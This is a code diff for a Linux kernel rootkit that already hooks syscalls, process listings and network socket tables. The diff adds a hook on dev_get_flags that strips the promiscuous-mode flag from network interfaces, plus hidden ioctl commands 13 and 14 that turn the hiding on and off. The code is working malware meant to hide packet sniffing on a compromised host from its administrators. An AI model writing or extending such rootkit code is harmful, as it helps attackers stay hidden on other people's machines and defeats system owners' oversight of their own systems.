@@ -24,6 +24,8 @@ static int (*o_root_filldir)(void *__buf, const char *name, int namelen, loff_t 
 unsigned long *sys_call_table;
 unsigned long *ia32_sys_call_table;
 
+unsigned int hide_promisc = 0;
+
 struct s_proc_args {
     unsigned short pid;
 };
@@ -570,6 +572,20 @@ int n_proc_readdir ( struct file *file, void *dirent, filldir_t filldir )
     return ret;
 }
 
+unsigned int n_dev_get_flags ( const struct net_device *dev )
+{
+    unsigned int ret;
+
+    hijack_pause(dev_get_flags);
+    ret = dev_get_flags(dev);
+    hijack_resume(dev_get_flags);
+
+    if ( hide_promisc )
+        ret &= ~IFF_PROMISC;
+
+    return ret;
+}
+
 static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long arg )
 {
     int ret;
@@ -843,6 +859,24 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                 }
                 break;
 
+            /* Hide network PROMISC flag */
+            case 13:
+                #if __DEBUG__
+                printk("Hiding PROMISC flag\n");
+                #endif
+
+                hide_promisc = 1;
+                break;
+
+            /* Unhide network PROMISC flag */
+            case 14:
+                #if __DEBUG__
+                printk("Unhiding PROMISC flag\n");
+                #endif
+
+                hide_promisc = 0;
+                break;
+
             default:
                 break;
         }
@@ -902,6 +936,9 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
     udp6_seq_show = get_udp_seq_show("/proc/net/udp6");
     hijack_start(udp6_seq_show, &n_udp6_seq_show);
 
+    /* Hook dev_get_flags() for PROMISC flag hiding */
+    hijack_start(dev_get_flags, &n_dev_get_flags);
+
     /* Hook inet_ioctl() for rootkit control */
     inet_ioctl = get_inet_ioctl(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     hijack_start(inet_ioctl, &n_inet_ioctl);
@@ -944,6 +981,7 @@ static void __exit mischief_managed ( void )
     #endif
 
     hijack_stop(inet_ioctl);
+    hijack_stop(dev_get_flags);
     hijack_stop(udp6_seq_show);
     hijack_stop(udp4_seq_show);
     hijack_stop(tcp6_seq_show);
